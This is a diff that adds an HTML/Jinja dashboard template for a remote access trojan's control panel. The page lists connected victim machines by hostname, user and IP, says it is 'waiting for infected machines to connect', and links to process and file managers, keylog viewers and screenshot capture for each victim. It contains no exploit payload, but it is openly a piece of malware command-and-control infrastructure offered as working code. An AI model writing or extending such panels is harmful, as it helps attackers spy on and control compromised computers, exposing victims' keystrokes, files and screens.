@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel - Dashboard</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='dashboard.css') }}">
+</head>
+<body>
+    <div class="sidebar">
+        <div class="logo">
+            <h2>🎯 RAT Control</h2>
+        </div>
+        <nav class="nav-menu">
+            <a href="/admin/dashboard" class="nav-item active">
+                <span class="icon">🏠</span>
+                <span>Dashboard</span>
+            </a>
+            <a href="#" class="nav-item" onclick="showStats()">
+                <span class="icon">📊</span>
+                <span>Statistics</span>
+            </a>
+            <a href="/admin/keylogs_stats" class="nav-item">
+                <span class="icon">⌨️</span>
+                <span>Keylog Stats</span>
+            </a>
+        </nav>
+        <div class="server-status">
+            <h3>Server Status</h3>
+            <div class="status-item">
+                <span>Status:</span>
+                <span class="status-online">🟢 Online</span>
+            </div>
+            <div class="status-item">
+                <span>Total Clients:</span>
+                <span id="totalClients">{{ total_clients }}</span>
+            </div>
+            <div class="status-item">
+                <span>Online:</span>
+                <span id="onlineClients">{{ online_clients }}</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-content">
+        <header>
+            <h1>🖥️ Connected Clients</h1>
+            <div class="header-actions">
+                <button class="btn btn-primary" onclick="refreshClients()">
+                    🔄 Refresh
+                </button>
+                <label class="auto-refresh">
+                    <input type="checkbox" id="autoRefresh" onchange="toggleAutoRefresh()">
+                    <span>Auto-refresh (10s)</span>
+                </label>
+            </div>
+        </header>
+
+        <div class="search-bar">
+            <input type="text" id="searchBox" placeholder="🔍 Search by hostname, IP, username..." onkeyup="filterClients()">
+        </div>
+
+        <div class="clients-grid" id="clientsGrid">
+            {% if clients %}
+                {% for client in clients %}
+                <div class="client-card" data-client-id="{{ client.client_id }}" 
+                     data-searchable="{{ client.system_info.hostname|lower }} {{ client.system_info.username|lower }} {{ client.ip|lower }}">
+                    <div class="card-header">
+                        <div class="status-indicator {{ 'online' if client.online else 'offline' }}"></div>
+                        <h3>{{ client.system_info.hostname }}</h3>
+                        <span class="status-badge {{ 'online' if client.online else 'offline' }}">
+                            {{ '🟢 Online' if client.online else '🔴 Offline' }}
+                        </span>
+                    </div>
+                    
+                    <div class="card-body">
+                        <div class="info-row">
+                            <span class="label">👤 User:</span>
+                            <span class="value">{{ client.system_info.username }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">💻 OS:</span>
+                            <span class="value">{{ client.system_info.platform }} {{ client.system_info.os }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">🌐 IP:</span>
+                            <span class="value">{{ client.ip }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">🆔 Client ID:</span>
+                            <span class="value client-id">{{ client.client_id[:16] }}...</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">⏱️ Uptime:</span>
+                            <span class="value">{{ client.uptime_seconds | format_uptime }}</span>
+                        </div>
+                        <div class="info-row">
+                            <span class="label">📞 Check-ins:</span>
+                            <span class="value">{{ client.checkin_count }}</span>
+                        </div>
+                    </div>
+                    
+                    <div class="card-actions">
+                        <button class="action-btn" onclick="manageProcesses('{{ client.client_id }}')" title="Process Manager">
+                            ⚙️ Processes
+                        </button>
+                        <button class="action-btn" onclick="manageFiles('{{ client.client_id }}')" title="File Manager">
+                            📁 Files
+                        </button>
+                        <button class="action-btn" onclick="viewKeylogs('{{ client.client_id }}')" title="View Keylogs">
+                            ⌨️ Keylogs
+                        </button>
+                        <button class="action-btn" onclick="takeScreenshot('{{ client.client_id }}')" title="Take Screenshot">
+                            📸 Screenshot
+                        </button>
+                        <button class="action-btn" onclick="viewSystemInfo('{{ client.client_id }}')" title="System Info">
+                            ℹ️ Info
+                        </button>
+                    </div>
+                </div>
+                {% endfor %}
+            {% else %}
+                <div class="no-clients">
+                    <div class="icon">🔌</div>
+                    <h2>No clients connected</h2>
+                    <p>Waiting for infected machines to connect...</p>
+                </div>
+            {% endif %}
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='main.js') }}"></script>
+    <script>
+        let autoRefreshInterval = null;
+
+        function filterClients() {
+            const searchTerm = document.getElementById('searchBox').value.toLowerCase();
+            const clientCards = document.querySelectorAll('.client-card');
+            
+            clientCards.forEach(card => {
+                const searchableText = card.getAttribute('data-searchable');
+                if (searchableText.includes(searchTerm)) {
+                    card.style.display = 'block';
+                } else {
+                    card.style.display = 'none';
+                }
+            });
+        }
+
+        function toggleAutoRefresh() {
+            const isChecked = document.getElementById('autoRefresh').checked;
+            
+            if (isChecked) {
+                autoRefreshInterval = setInterval(() => {
+                    window.location.reload();
+                }, 10000);
+            } else {
+                if (autoRefreshInterval) {
+                    clearInterval(autoRefreshInterval);
+                    autoRefreshInterval = null;
+                }
+            }
+        }
+
+        function refreshClients() {
+            window.location.reload();
+        }
+
+        function manageProcesses(clientId) {
+            window.location.href = `/admin/processes/${clientId}`;
+        }
+
+        function manageFiles(clientId) {
+            window.location.href = `/admin/files/${clientId}`;
+        }
+
+        function viewKeylogs(clientId) {
+            window.location.href = `/admin/keylogs/${clientId}`;
+        }
+
+        function takeScreenshot(clientId) {
+            window.location.href = `/admin/screenshot/${clientId}`;
+        }
+
+        function viewSystemInfo(clientId) {
+            window.location.href = `/admin/system/${clientId}`;
+        }
+
+        function showStats() {
+            window.location.href = '/admin/keylogs_stats';
+        }
+    </script>
+</body>
+</html>
